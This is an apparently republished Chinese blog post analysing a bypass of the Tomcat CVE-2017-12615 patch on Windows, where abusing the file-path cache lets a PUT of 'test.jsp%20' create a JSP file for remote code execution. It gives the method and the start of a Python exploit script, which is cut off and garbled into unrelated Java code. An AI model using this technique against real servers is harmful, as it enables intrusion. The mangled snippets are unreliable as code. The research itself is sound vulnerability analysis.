作者：[RicterZ](https://ricterz.me/posts/Abuse%20Cache%20of%20WinNTFileSystem%20%3A%20Yet%20Another%20Bypass%20of%20Tomcat%20CVE-2017-12615
"RicterZ")
#### 0x01 CVE-2017-12615 补丁分析
CVE-2017-12615 是 Tomcat 在设置了 `readonly` 为 `false` 状态下，可以通过 PUT 创建一个“.jsp
”的文件。由于后缀名非 `.jsp` 和 `.jspx`，所以 Tomcat 在处理的时候经由 `DefaultServlet` 处理而不是
`JspServlet`，又由于 Windows 不允许文件名为空格结尾，所以可以成功创建一个 JSP 文件，以达到 RCE 的结果。
龙哥在周五敲我说，在高并发的情况下，还是可以成功写入一个 JSP 文件；同时微博上的一个小伙伴也告诉我，在一定的条件下还是可以成功创建文件。
**测试发现，对于 7.0.81 可以成功复现，但是对于 8.5.21 失败。如下代码分析是基于 Apache Tomcat 7.0.81 的。**
经过分析，我发现这两种情况其实本质是相同的。不过在此之前，首先看一下 Tomcat 对于 CVE-2017-12615 的补丁好了。
同样的，进入 `DefaultServlet` 的 `doPut` 方法，再调用到 `FileDirContext` 的 `bind` 方法，接着调用
`file` 方法：
    protected File file(String name, boolean mustExist) {
        File file = new File(base, name);
        return validate(file, mustExist, absoluteBase);
    }
注意到 `mustExist` 为 `false`：
    protected File validate(File file, boolean mustExist, String absoluteBase) {
        if (!mustExist || file.exists() && file.canRead()) { // !mustExist = true，进入 if
            ...
            try {
                canPath = file.getCanonicalPath(); 
                // 此处，对路径进行规范化，调用的是 java.io.File 内的方法
                // 之前的 Payload 中结尾为空格，那么这个方法就会去掉空格
            } catch (IOException e) {
            }
            ...
            if ((absoluteBase.length() >> os.path.exists("C:/Windows/System32/cmd.exe")
    True
    >>> os.path.exists("C:/Windows/System32/cmd.exe ")
    True
那么，在无已知文件的情况下，我们只需要先 `PUT` 创建一个 `test.txt`，在 `PUT` 一个 `test.txt%20`，即可向
`prefixCache` 添加数据了。
单步查看，发现已经通过分支，并且向 `prefixCache` 添加数据：
接着，创建一个 JSP 文件“test.jsp%20”，单步查看：
可以发现，`resDir` 不为 `null`，且 `res` 结尾带着空格。于是可以通过最开始的 `canPath.equals(absPath)`
的检查。查看 BurpSuite 中的返回：
发现已经创建成功了。
Exploit:
    import sys
    import requests
    import random
    import hashlib
    shell_content = '''
    RR is handsome!
    '''
    if len(sys.argv) ",
                                                   off - 1);
            ...
            } else {
                if (isInvalidPathChar(c))
                    throw new InvalidPathException(path,
                                                   "Illegal char ",
                                                   off);
                lastC = c;
                off++;
            }
        }
        if (start != off) {
            if (lastC == ' ')
                throw new InvalidPathException(path,
                                               "Trailing char ",
                                               off - 1);
            sb.append(path, start, off);
        }
        return sb.toString();
    }
以及：
    private static final boolean isInvalidPathChar(char var0) {
        return var0 :\"|?*".indexOf(var0) != -1;
    }
难过。
* * *